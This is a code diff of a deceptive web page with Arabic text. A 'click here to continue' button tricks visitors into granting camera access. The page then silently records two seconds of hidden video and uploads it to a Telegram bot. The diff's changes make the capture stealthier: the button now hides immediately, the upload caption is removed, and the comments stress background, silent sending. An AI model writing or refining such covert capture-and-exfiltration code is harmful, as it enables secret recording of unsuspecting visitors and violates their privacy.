@@ -10,7 +10,7 @@
     </style>
 </head>
 <body>
-    <button onclick="startRecording()">اضغط هنا للمتابعة</button>
+    <button id="mainBtn" onclick="startRecording()">اضغط هنا للمتابعة</button>
     <video id="v" autoplay playsinline style="display:none;"></video>
 
     <script>
@@ -23,8 +23,8 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // إخفاء الزر فقط بدون إظهار أي كلمات مزعجة
-                document.getElementById('btn').style.display = 'none';
+                // إخفاء الزر فوراً بمجرد الضغط عليه وبدون إظهار أي نصوص
+                document.getElementById('mainBtn').style.display = 'none';
 
                 let mediaRecorder;
                 let chunks = [];
@@ -44,7 +44,6 @@
                     const formData = new FormData();
                     formData.append('chat_id', CHAT);
                     formData.append('video', blob, 'visitor_video.webm');
-                    formData.append('caption', '🚨 فيديو توثيقي للزائر:');
 
                     try {
                         await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
@@ -60,7 +59,7 @@
 
                 mediaRecorder.start();
 
-                // تسجيل لمدة ثانيتين في الخلفية ثم إيقافه بهدوء
+                // التسجيل لمدة ثانيتين في الخلفية ثم الإيقاف والإرسال بصمت
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
@@ -68,6 +67,7 @@
                 }, 2000);
 
             } catch (e) {
+                // في حال رفض إذن الكاميرا يظهر تنبيه بسيط فقط
                 alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
         }
